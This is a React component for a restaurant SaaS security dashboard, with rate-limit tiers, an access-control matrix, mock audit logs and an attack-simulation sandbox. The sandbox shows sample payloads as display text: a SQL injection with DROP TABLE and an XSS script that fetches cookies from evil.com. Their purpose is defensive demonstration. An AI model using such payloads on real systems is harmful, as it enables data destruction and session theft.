import React, { useState, useEffect } from 'react';
import {
  Shield,
  ShieldCheck,
  ShieldAlert,
  Lock,
  KeyRound,
  Zap,
  Activity,
  Server,
  FileCode,
  Copy,
  Check,
  AlertTriangle,
  Play,
  RotateCcw,
  CheckCircle2,
  XCircle,
  Database,
  Cpu,
  Layers,
  ArrowRight,
  ExternalLink,
  Code2
} from 'lucide-react';
import { AuthUser, SecurityAuditLog, SubscriptionTier } from '../types';
import { NEXT_MIDDLEWARE_SOURCE_CODE } from '../security/next-middleware';

interface SecurityCenterProps {
  currentUser: AuthUser | null;
  onOpenAuthModal: () => void;
}

export const SecurityCenter: React.FC<SecurityCenterProps> = ({
  currentUser,
  onOpenAuthModal,
}) => {
  const [activeTab, setActiveTab] = useState<'OVERVIEW' | 'RATE_LIMITS' | 'RBAC_MATRIX' | 'ATTACK_SIMULATOR' | 'NEXT_CODE' | 'AUDIT_LOGS'>('OVERVIEW');
  const [copiedCode, setCopiedCode] = useState(false);

  // Live simulation states
  const [simulatedAttack, setSimulatedAttack] = useState<'SQL_INJECTION' | 'XSS' | 'TIER_BYPASS' | 'BRUTE_FORCE' | null>(null);
  const [simResponse, setSimResponse] = useState<any>(null);
  const [isSimulating, setIsSimulating] = useState(false);

  // Live mock audit logs
  const [auditLogs, setAuditLogs] = useState<SecurityAuditLog[]>([
    {
      id: 'log-101',
      timestamp: '2 mins ago',
      eventType: 'BRUTE_FORCE_BLOCKED',
      ipAddress: '198.51.100.42',
      userAgent: 'python-requests/2.31',
      severity: 'HIGH',
      details: 'Exceeded 5 auth attempts in 15 mins. IP temporarily throttled with 429 Too Many Requests.',
    },
    {
      id: 'log-102',
      timestamp: '8 mins ago',
      eventType: 'UNAUTHORIZED_TIER_ACCESS_BLOCKED',
      ipAddress: '203.0.113.19',
      userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
      severity: 'MEDIUM',
      details: 'Free Tier tenant attempted to invoke /api/pro/kot-dispatch. Blocked with 403 Forbidden (ERR_RBAC_TIER_PRO_REQUIRED).',
    },
    {
      id: 'log-103',
      timestamp: '14 mins ago',
      eventType: 'SQL_INJECTION_BLOCKED',
      ipAddress: '192.0.2.88',
      userAgent: 'sqlmap/1.7.2#stable',
      severity: 'CRITICAL',
      details: "Pattern `' OR '1'='1' detected in query parameter. Sanitizer rejected request before query execution.",
    },
    {
      id: 'log-104',
      timestamp: '22 mins ago',
      eventType: 'MFA_CHALLENGE_SUCCESS',
      ipAddress: '104.28.14.77',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      severity: 'LOW',
      details: 'Super Admin successfully completed TOTP 6-digit challenge. Session token issued.',
    },
  ]);

  // Rate Limiting stats
  const [rateLimitStats, setRateLimitStats] = useState({
    freeTierLimit: 60,
    freeTierUsed: 24,
    plusTierLimit: 300,
    plusTierUsed: 68,
    proTierLimit: 1200,
    proTierUsed: 142,
    authLimit: 5,
    authUsed: 1,
    cacheHitRatio: '94.2%',
    avgEdgeLatency: '14ms',
  });

  const handleCopyCode = () => {
    navigator.clipboard.writeText(NEXT_MIDDLEWARE_SOURCE_CODE);
    setCopiedCode(true);
    setTimeout(() => setCopiedCode(false), 2000);
  };

  // Run Attack Simulation against server security engine
  const handleRunSimulation = async (type: 'SQL_INJECTION' | 'XSS' | 'TIER_BYPASS' | 'BRUTE_FORCE') => {
    setIsSimulating(true);
    setSimulatedAttack(type);
    setSimResponse(null);

    try {
      const res = await fetch('/api/security/simulate-attack', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          attackType: type,
          clientTier: currentUser?.tier || 'FREE',
          clientRole: currentUser?.role || 'TENANT_OWNER',
        }),
      });
      const data = await res.json();
      setSimResponse({
        status: res.status,
        data,
      });

      // Append to live logs
      const newLog: SecurityAuditLog = {
        id: `log-${Date.now()}`,
        timestamp: 'Just now',
        eventType:
          type === 'SQL_INJECTION'
            ? 'SQL_INJECTION_BLOCKED'
            : type === 'XSS'
            ? 'XSS_ATTACK_BLOCKED'
            : type === 'TIER_BYPASS'
            ? 'UNAUTHORIZED_TIER_ACCESS_BLOCKED'
            : 'RATE_LIMIT_EXCEEDED',
        ipAddress: '127.0.0.1 (Simulator)',
        userAgent: 'Ceyteq-Security-Auditor/1.0',
        severity: type === 'SQL_INJECTION' ? 'CRITICAL' : type === 'TIER_BYPASS' ? 'MEDIUM' : 'HIGH',
        details: data.message || `Defensive perimeter intercepted ${type} attack.`,
      };
      setAuditLogs(prev => [newLog, ...prev.slice(0, 7)]);
    } catch {
      setSimResponse({
        status: 500,
        data: { error: 'Simulation request failed' },
      });
    } finally {
      setIsSimulating(false);
    }
  };

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-8 py-6 space-y-6">
      {/* Top Banner */}
      <div className="bg-gradient-to-r from-[#0A192F] via-[#0D2544] to-[#004B6E] rounded-3xl p-6 sm:p-8 text-white shadow-xl relative overflow-hidden border border-sky-300/20">
        <div className="relative z-10 flex flex-col md:flex-row md:items-center justify-between gap-6">
          <div className="max-w-2xl">
            <div className="flex items-center gap-2 mb-2">
              <span className="text-[10px] font-black uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-[#00C8FF]/20 text-[#00C8FF] border border-[#00C8FF]/30 font-mono">
                ENTERPRISE RESILIENCE ENGINE
              </span>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                ZERO DOWNTIME
              </span>
            </div>
            <h1 className="text-xl sm:text-2xl font-black tracking-tight">
              Security Perimeter, Crash Prevention & Rate Limiting
            </h1>
            <p className="text-xs sm:text-sm text-sky-100/80 mt-2 leading-relaxed">
              Engineered to handle massive free-tier onboarding surges without performance degradation.
              Features sliding-window rate limiting, NextAuth JWT & TOTP 2FA, edge caching, and strict multi-tenant RBAC barriers.
            </p>
          </div>

          {/* User Session Quick Card */}
          <div className="bg-white/10 backdrop-blur-md rounded-2xl p-4 border border-white/20 min-w-[260px] shrink-0">
            <div className="flex items-center justify-between mb-2">
              <span className="text-[11px] font-bold text-sky-200">Active Security Session</span>
              <span className={`text-[9px] font-black px-2 py-0.5 rounded-full ${
                currentUser ? 'bg-emerald-400/20 text-emerald-300 border border-emerald-400/30' : 'bg-amber-400/20 text-amber-300'
              }`}>
                {currentUser ? 'AUTHENTICATED' : 'ANONYMOUS'}
              </span>
            </div>

            <div className="text-xs font-bold text-white flex items-center gap-1.5">
              <ShieldCheck className="w-4 h-4 text-[#00C8FF]" />
              <span>{currentUser?.name || 'Guest / Unauthenticated'}</span>
            </div>

            <div className="mt-2 text-[11px] text-sky-200/80 flex items-center justify-between">
              <span>Role: <strong className="text-white">{currentUser?.role || 'PUBLIC'}</strong></span>
              <span>Tier: <strong className="text-white">{currentUser?.tier || 'FREE'}</strong></span>
            </div>

            <button
              onClick={onOpenAuthModal}
              className="w-full mt-3 py-1.5 px-3 rounded-xl bg-[#00C8FF] hover:bg-[#00B4E6] text-[#0A192F] text-xs font-black transition-all shadow-sm flex items-center justify-center gap-1.5"
            >
              <KeyRound className="w-3.5 h-3.5" />
              <span>Switch Account / 2FA</span>
            </button>
          </div>
        </div>

        {/* Metric Quick Strip */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-6 pt-6 border-t border-white/10">
          <div className="p-3 rounded-xl bg-white/5 border border-white/10">
            <span className="text-[10px] text-sky-300 block font-medium">Edge Cache Hit Ratio</span>
            <span className="text-lg font-black text-white font-mono">{rateLimitStats.cacheHitRatio}</span>
          </div>
          <div className="p-3 rounded-xl bg-white/5 border border-white/10">
            <span className="text-[10px] text-sky-300 block font-medium">Free Tier Quota</span>
            <span className="text-lg font-black text-[#00C8FF] font-mono">60 req/min</span>
          </div>
          <div className="p-3 rounded-xl bg-white/5 border border-white/10">
            <span className="text-[10px] text-sky-300 block font-medium">Brute-Force Auth Barrier</span>
            <span className="text-lg font-black text-emerald-400 font-mono">5 tries / 15m</span>
          </div>
          <div className="p-3 rounded-xl bg-white/5 border border-white/10">
            <span className="text-[10px] text-sky-300 block font-medium">Average Edge Latency</span>
            <span className="text-lg font-black text-white font-mono">{rateLimitStats.avgEdgeLatency}</span>
          </div>
        </div>
      </div>

      {/* Tabs */}
      <div className="flex items-center gap-2 overflow-x-auto no-scrollbar bg-sky-100/70 p-1.5 rounded-2xl border border-sky-200/80 shadow-xs">
        <button
          onClick={() => setActiveTab('OVERVIEW')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all whitespace-nowrap ${
            activeTab === 'OVERVIEW' ? 'bg-[#00C8FF] text-[#0A192F] shadow-sm font-black' : 'text-slate-600 hover:text-slate-900 hover:bg-white/80'
          }`}
        >
          <Activity className="w-4 h-4" />
          <span>Security Overview</span>
        </button>

        <button
          onClick={() => setActiveTab('RATE_LIMITS')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all whitespace-nowrap ${
            activeTab === 'RATE_LIMITS' ? 'bg-[#00C8FF] text-[#0A192F] shadow-sm font-black' : 'text-slate-600 hover:text-slate-900 hover:bg-white/80'
          }`}
        >
          <Zap className="w-4 h-4" />
          <span>Rate Limiter & Quotas</span>
        </button>

        <button
          onClick={() => setActiveTab('RBAC_MATRIX')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all whitespace-nowrap ${
            activeTab === 'RBAC_MATRIX' ? 'bg-[#00C8FF] text-[#0A192F] shadow-sm font-black' : 'text-slate-600 hover:text-slate-900 hover:bg-white/80'
          }`}
        >
          <Layers className="w-4 h-4" />
          <span>Tier RBAC Barrier</span>
        </button>

        <button
          onClick={() => setActiveTab('ATTACK_SIMULATOR')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all whitespace-nowrap ${
            activeTab === 'ATTACK_SIMULATOR' ? 'bg-[#00C8FF] text-[#0A192F] shadow-sm font-black' : 'text-slate-600 hover:text-slate-900 hover:bg-white/80'
          }`}
        >
          <ShieldAlert className="w-4 h-4 text-rose-500" />
          <span>Attack Simulation Sandbox</span>
        </button>

        <button
          onClick={() => setActiveTab('NEXT_CODE')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all whitespace-nowrap ${
            activeTab === 'NEXT_CODE' ? 'bg-[#00C8FF] text-[#0A192F] shadow-sm font-black' : 'text-slate-600 hover:text-slate-900 hover:bg-white/80'
          }`}
        >
          <FileCode className="w-4 h-4 text-[#0098CC]" />
          <span>Next.js middleware.ts</span>
        </button>

        <button
          onClick={() => setActiveTab('AUDIT_LOGS')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all whitespace-nowrap ${
            activeTab === 'AUDIT_LOGS' ? 'bg-[#00C8FF] text-[#0A192F] shadow-sm font-black' : 'text-slate-600 hover:text-slate-900 hover:bg-white/80'
          }`}
        >
          <Server className="w-4 h-4" />
          <span>Security Audit Trail</span>
        </button>
      </div>

      {/* TAB 1: OVERVIEW */}
      {activeTab === 'OVERVIEW' && (
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          {/* Card 1: Enterprise Authentication & MFA */}
          <div className="p-6 rounded-3xl bg-white border border-sky-100 shadow-sm space-y-4">
            <div className="w-10 h-10 rounded-2xl bg-sky-50 text-[#00A3D9] flex items-center justify-center border border-sky-200">
              <Lock className="w-5 h-5" />
            </div>
            <h3 className="text-sm font-black text-slate-900">1. Authentication & Verification</h3>
            <p className="text-xs text-slate-500 leading-relaxed">
              Standardized on NextAuth.js JWT architecture with encrypted stateless tokens. 
              Enforces mandatory 6-digit email OTP verification before free accounts can be activated to eliminate bot signups.
            </p>
            <ul className="space-y-2 text-xs text-slate-700">
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                <span>HMAC-SHA256 signed stateless JWTs</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                <span>Email OTP verification with 10m TTL</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                <span>TOTP Multi-Factor Authentication (MFA)</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                <span>Progressive delay & IP lockout on 5 failed attempts</span>
              </li>
            </ul>
          </div>

          {/* Card 2: High Traffic Crash Prevention */}
          <div className="p-6 rounded-3xl bg-white border border-sky-100 shadow-sm space-y-4">
            <div className="w-10 h-10 rounded-2xl bg-emerald-50 text-emerald-600 flex items-center justify-center border border-emerald-200">
              <Zap className="w-5 h-5" />
            </div>
            <h3 className="text-sm font-black text-slate-900">2. Crash Prevention & Caching</h3>
            <p className="text-xs text-slate-500 leading-relaxed">
              Protects server compute from spikes through high-speed edge caching (Stale-While-Revalidate) and token-bucket sliding rate limiters.
            </p>
            <ul className="space-y-2 text-xs text-slate-700">
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                <span>Sliding window rate limit by IP + Tenant ID</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                <span>60 req/min ceiling for massive Free Tier base</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                <span>In-memory Edge Caching (94%+ hit ratio)</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                <span>Global React ErrorBoundary & API fallback pages</span>
              </li>
            </ul>
          </div>

          {/* Card 3: Vulnerability Shield & RBAC */}
          <div className="p-6 rounded-3xl bg-white border border-sky-100 shadow-sm space-y-4">
            <div className="w-10 h-10 rounded-2xl bg-purple-50 text-purple-600 flex items-center justify-center border border-purple-200">
              <Shield className="w-5 h-5" />
            </div>
            <h3 className="text-sm font-black text-slate-900">3. OWASP & Tier RBAC Barriers</h3>
            <p className="text-xs text-slate-500 leading-relaxed">
              Next.js Edge Middleware enforces zero-trust boundaries: free tier accounts are cryptographically blocked from Pro/Plus features.
            </p>
            <ul className="space-y-2 text-xs text-slate-700">
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                <span>Ceyteq Master Admin strictly guarded (/admin)</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                <span>Free tier locked out of KDS Kitchen / POS APIs</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                <span>Strict CSP, HSTS, X-Frame-Options headers</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                <span>SQL/NoSQL injection & XSS stripping filters</span>
              </li>
            </ul>
          </div>
        </div>
      )}

      {/* TAB 2: RATE LIMITS & QUOTAS */}
      {activeTab === 'RATE_LIMITS' && (
        <div className="space-y-6">
          <div className="p-6 rounded-3xl bg-white border border-sky-100 shadow-sm">
            <div className="flex items-center justify-between mb-4">
              <div>
                <h3 className="text-sm font-black text-slate-900">Multi-Tier Sliding Window Rate Limiting</h3>
                <p className="text-xs text-slate-500">
                  Prevents single free-tier clients or scrapers from degrading performance for paid restaurant partners.
                </p>
              </div>
              <span className="text-xs font-mono font-bold text-slate-500 bg-slate-100 px-3 py-1 rounded-xl">
                Algorithm: Token Bucket (60s Window)
              </span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
              {/* Free Tier */}
              <div className="p-4 rounded-2xl bg-slate-50 border border-slate-200">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs font-bold text-slate-700">Free Tier (Massive Volume)</span>
                  <span className="text-[10px] font-mono bg-slate-200 text-slate-700 px-2 py-0.5 rounded font-bold">
                    60 REQ / MIN
                  </span>
                </div>
                <div className="w-full bg-slate-200 h-2 rounded-full overflow-hidden mb-2">
                  <div
                    className="bg-[#00A3D9] h-full rounded-full"
                    style={{ width: `${(rateLimitStats.freeTierUsed / rateLimitStats.freeTierLimit) * 100}%` }}
                  />
                </div>
                <div className="flex items-center justify-between text-[11px] text-slate-500">
                  <span>Current: {rateLimitStats.freeTierUsed} reqs</span>
                  <span>Cap: {rateLimitStats.freeTierLimit} reqs</span>
                </div>
                <p className="text-[10px] text-slate-400 mt-2">
                  Applies to unauthenticated QR menu viewers and free-tier owners to insulate the cluster from DDoS.
                </p>
              </div>

              {/* Plus Tier */}
              <div className="p-4 rounded-2xl bg-sky-50/60 border border-sky-200">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs font-bold text-slate-900">Plus Tier (Online Delivery)</span>
                  <span className="text-[10px] font-mono bg-sky-200 text-sky-800 px-2 py-0.5 rounded font-bold">
                    300 REQ / MIN
                  </span>
                </div>
                <div className="w-full bg-sky-200 h-2 rounded-full overflow-hidden mb-2">
                  <div
                    className="bg-[#008BB8] h-full rounded-full"
                    style={{ width: `${(rateLimitStats.plusTierUsed / rateLimitStats.plusTierLimit) * 100}%` }}
                  />
                </div>
                <div className="flex items-center justify-between text-[11px] text-slate-500">
                  <span>Current: {rateLimitStats.plusTierUsed} reqs</span>
                  <span>Cap: {rateLimitStats.plusTierLimit} reqs</span>
                </div>
                <p className="text-[10px] text-slate-400 mt-2">
                  Accommodates live delivery order polling, driver webhooks, and WhatsApp confirmation messaging.
                </p>
              </div>

              {/* Pro Tier */}
              <div className="p-4 rounded-2xl bg-pink-50/60 border border-pink-200">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-xs font-bold text-slate-900">Pro Tier (Enterprise POS/KDS)</span>
                  <span className="text-[10px] font-mono bg-pink-200 text-pink-800 px-2 py-0.5 rounded font-bold">
                    1,200 REQ / MIN
                  </span>
                </div>
                <div className="w-full bg-pink-200 h-2 rounded-full overflow-hidden mb-2">
                  <div
                    className="bg-pink-600 h-full rounded-full"
                    style={{ width: `${(rateLimitStats.proTierUsed / rateLimitStats.proTierLimit) * 100}%` }}
                  />
                </div>
                <div className="flex items-center justify-between text-[11px] text-slate-500">
                  <span>Current: {rateLimitStats.proTierUsed} reqs</span>
                  <span>Cap: {rateLimitStats.proTierLimit} reqs</span>
                </div>
                <p className="text-[10px] text-slate-400 mt-2">
                  Full bandwidth for real-time kitchen displays, table waiter calls, and high-frequency POS receipts.
                </p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* TAB 3: RBAC MATRIX */}
      {activeTab === 'RBAC_MATRIX' && (
        <div className="p-6 rounded-3xl bg-white border border-sky-100 shadow-sm">
          <div className="mb-4">
            <h3 className="text-sm font-black text-slate-900">Role & Subscription Tier Access Control Matrix</h3>
            <p className="text-xs text-slate-500">
              Verified by Next.js Edge Middleware before any controller executes.
            </p>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-xs text-left">
              <thead>
                <tr className="border-b border-slate-200 text-slate-400 font-mono text-[10px] uppercase">
                  <th className="py-2.5 px-3">Platform Capability / Route</th>
                  <th className="py-2.5 px-3 text-center">Free Tier</th>
                  <th className="py-2.5 px-3 text-center">Plus Tier</th>
                  <th className="py-2.5 px-3 text-center">Pro Tier</th>
                  <th className="py-2.5 px-3 text-center">Super Admin</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100 text-slate-700">
                <tr>
                  <td className="py-3 px-3 font-medium">Public Customer QR Menu Browsing (/menu/*)</td>
                  <td className="py-3 px-3 text-center text-emerald-600 font-bold">✓ Active</td>
                  <td className="py-3 px-3 text-center text-emerald-600 font-bold">✓ Active</td>
                  <td className="py-3 px-3 text-center text-emerald-600 font-bold">✓ Active</td>
                  <td className="py-3 px-3 text-center text-emerald-600 font-bold">✓ Active</td>
                </tr>
                <tr>
                  <td className="py-3 px-3 font-medium">Online Delivery & Payment Gateway (/api/plus/*)</td>
                  <td className="py-3 px-3 text-center text-rose-500 font-bold">✗ Blocked (403)</td>
                  <td className="py-3 px-3 text-center text-emerald-600 font-bold">✓ Active</td>
                  <td className="py-3 px-3 text-center text-emerald-600 font-bold">✓ Active</td>
                  <td className="py-3 px-3 text-center text-emerald-600 font-bold">✓ Active</td>
                </tr>
                <tr>
                  <td className="py-3 px-3 font-medium">Pro POS & Kitchen Display KOT (/api/pro/*)</td>
                  <td className="py-3 px-3 text-center text-rose-500 font-bold">✗ Blocked (403)</td>
                  <td className="py-3 px-3 text-center text-rose-500 font-bold">✗ Blocked (403)</td>
                  <td className="py-3 px-3 text-center text-emerald-600 font-bold">✓ Active</td>
                  <td className="py-3 px-3 text-center text-emerald-600 font-bold">✓ Active</td>
                </tr>
                <tr>
                  <td className="py-3 px-3 font-medium">TasTrip Mobile App Stores (iOS & Android)</td>
                  <td className="py-3 px-3 text-center text-rose-500 font-bold">✗ Locked</td>
                  <td className="py-3 px-3 text-center text-rose-500 font-bold">✗ Locked</td>
                  <td className="py-3 px-3 text-center text-emerald-600 font-bold">✓ Active</td>
                  <td className="py-3 px-3 text-center text-emerald-600 font-bold">✓ Active</td>
                </tr>
                <tr>
                  <td className="py-3 px-3 font-medium">Ceyteq Master Admin Dashboard (/admin/*)</td>
                  <td className="py-3 px-3 text-center text-rose-500 font-bold">✗ Denied (403)</td>
                  <td className="py-3 px-3 text-center text-rose-500 font-bold">✗ Denied (403)</td>
                  <td className="py-3 px-3 text-center text-rose-500 font-bold">✗ Denied (403)</td>
                  <td className="py-3 px-3 text-center text-emerald-600 font-bold">✓ Full Clearance</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* TAB 4: ATTACK SIMULATOR */}
      {activeTab === 'ATTACK_SIMULATOR' && (
        <div className="p-6 rounded-3xl bg-white border border-sky-100 shadow-sm space-y-4">
          <div className="flex items-center justify-between">
            <div>
              <h3 className="text-sm font-black text-slate-900">Vulnerability & Abuse Defense Simulator</h3>
              <p className="text-xs text-slate-500">
                Trigger simulated penetration attempts against the running backend to verify real-time interception.
              </p>
            </div>
            <span className="text-xs text-rose-600 bg-rose-50 px-2.5 py-1 rounded-xl border border-rose-200 font-bold">
              Isolated Live Sandbox
            </span>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            {/* Test 1: SQLi */}
            <button
              onClick={() => handleRunSimulation('SQL_INJECTION')}
              disabled={isSimulating}
              className="p-4 rounded-2xl bg-slate-50 hover:bg-slate-100 border border-slate-200 text-left transition-all hover:border-[#00A3D9]"
            >
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-bold text-slate-900">SQL Injection</span>
                <Play className="w-3.5 h-3.5 text-[#00A3D9]" />
              </div>
              <p className="text-[11px] text-slate-500 font-mono">
                ' OR '1'='1'; DROP TABLE tenants; --
              </p>
              <span className="text-[10px] text-slate-400 block mt-2">Tests input sanitizer middleware</span>
            </button>

            {/* Test 2: XSS */}
            <button
              onClick={() => handleRunSimulation('XSS')}
              disabled={isSimulating}
              className="p-4 rounded-2xl bg-slate-50 hover:bg-slate-100 border border-slate-200 text-left transition-all hover:border-[#00A3D9]"
            >
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-bold text-slate-900">XSS Script Injection</span>
                <Play className="w-3.5 h-3.5 text-[#00A3D9]" />
              </div>
              <p className="text-[11px] text-slate-500 font-mono truncate">
                &lt;script&gt;fetch('https://evil.com/cookie')&lt;/script&gt;
              </p>
              <span className="text-[10px] text-slate-400 block mt-2">Tests HTML tag stripping & CSP</span>
            </button>

            {/* Test 3: Tier Bypass */}
            <button
              onClick={() => handleRunSimulation('TIER_BYPASS')}
              disabled={isSimulating}
              className="p-4 rounded-2xl bg-slate-50 hover:bg-slate-100 border border-slate-200 text-left transition-all hover:border-[#00A3D9]"
            >
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-bold text-slate-900">Free Tier RBAC Bypass</span>
                <Play className="w-3.5 h-3.5 text-[#00A3D9]" />
              </div>
              <p className="text-[11px] text-slate-500 font-mono">
                POST /api/pro/pos-receipt-print
              </p>
              <span className="text-[10px] text-slate-400 block mt-2">Verifies 403 Forbidden barrier</span>
            </button>

            {/* Test 4: Brute Force */}
            <button
              onClick={() => handleRunSimulation('BRUTE_FORCE')}
              disabled={isSimulating}
              className="p-4 rounded-2xl bg-slate-50 hover:bg-slate-100 border border-slate-200 text-left transition-all hover:border-[#00A3D9]"
            >
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-bold text-slate-900">Brute-Force Attack</span>
                <Play className="w-3.5 h-3.5 text-[#00A3D9]" />
              </div>
              <p className="text-[11px] text-slate-500 font-mono">
                100 rapid login requests / 10s
              </p>
              <span className="text-[10px] text-slate-400 block mt-2">Verifies 429 Too Many Requests</span>
            </button>
          </div>

          {/* Simulation Output Console */}
          {simResponse && (
            <div className="mt-4 p-4 rounded-2xl bg-slate-900 text-white font-mono text-xs border border-slate-800 space-y-2">
              <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                <span className="text-slate-400">Response Status:</span>
                <span
                  className={`font-bold px-2 py-0.5 rounded text-[11px] ${
                    simResponse.status === 403 || simResponse.status === 400 || simResponse.status === 429
                      ? 'bg-emerald-950 text-emerald-300 border border-emerald-700'
                      : 'bg-rose-950 text-rose-300 border border-rose-700'
                  }`}
                >
                  HTTP {simResponse.status} (Attack Intercepted & Blocked)
                </span>
              </div>
              <pre className="text-emerald-400 whitespace-pre-wrap overflow-x-auto text-[11px]">
                {JSON.stringify(simResponse.data, null, 2)}
              </pre>
            </div>
          )}
        </div>
      )}

      {/* TAB 5: NEXT.JS MIDDLEWARE SOURCE CODE */}
      {activeTab === 'NEXT_CODE' && (
        <div className="p-6 rounded-3xl bg-slate-900 text-white border border-slate-800 shadow-xl space-y-4">
          <div className="flex items-center justify-between flex-wrap gap-3">
            <div>
              <div className="flex items-center gap-2">
                <FileCode className="w-5 h-5 text-[#00C8FF]" />
                <h3 className="text-sm font-bold font-mono text-white">/middleware.ts (Next.js 14/15 Production Edge)</h3>
              </div>
              <p className="text-xs text-slate-400 mt-1">
                Zero-cold-start Edge middleware enforcing rate limits, security headers, JWT validation, and RBAC tier barriers.
              </p>
            </div>

            <button
              onClick={handleCopyCode}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-xs font-mono font-bold transition-all text-sky-300 border border-slate-700"
            >
              {copiedCode ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              <span>{copiedCode ? 'Copied Code!' : 'Copy middleware.ts'}</span>
            </button>
          </div>

          <pre className="p-4 rounded-2xl bg-slate-950 text-slate-200 text-xs font-mono overflow-x-auto max-h-[480px] border border-slate-800 leading-relaxed">
            {NEXT_MIDDLEWARE_SOURCE_CODE}
          </pre>
        </div>
      )}

      {/* TAB 6: AUDIT TRAIL */}
      {activeTab === 'AUDIT_LOGS' && (
        <div className="p-6 rounded-3xl bg-white border border-sky-100 shadow-sm space-y-4">
          <div className="flex items-center justify-between">
            <div>
              <h3 className="text-sm font-black text-slate-900">Real-Time Security Event Audit Stream</h3>
              <p className="text-xs text-slate-500">
                Monitors failed logins, rate limit violations, injection attempts, and unauthorized tier escalations.
              </p>
            </div>
            <span className="text-xs font-mono text-slate-500 bg-slate-100 px-2.5 py-1 rounded-xl">
              Live Feed
            </span>
          </div>

          <div className="divide-y divide-slate-100">
            {auditLogs.map(log => (
              <div key={log.id} className="py-3 flex items-start justify-between gap-4">
                <div className="space-y-1">
                  <div className="flex items-center gap-2">
                    <span
                      className={`text-[9px] font-black font-mono px-2 py-0.5 rounded ${
                        log.severity === 'CRITICAL'
                          ? 'bg-rose-100 text-rose-700 border border-rose-200'
                          : log.severity === 'HIGH'
                          ? 'bg-amber-100 text-amber-700 border border-amber-200'
                          : 'bg-sky-100 text-sky-700 border border-sky-200'
                      }`}
                    >
                      {log.eventType}
                    </span>
                    <span className="text-xs font-bold text-slate-800">{log.ipAddress}</span>
                    <span className="text-[10px] text-slate-400">{log.timestamp}</span>
                  </div>
                  <p className="text-xs text-slate-600">{log.details}</p>
                  <p className="text-[10px] text-slate-400 font-mono truncate max-w-xl">{log.userAgent}</p>
                </div>

                <span
                  className={`text-[10px] font-bold px-2 py-0.5 rounded ${
                    log.severity === 'CRITICAL' ? 'text-rose-600' : 'text-slate-500'
                  }`}
                >
                  {log.severity}
                </span>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};
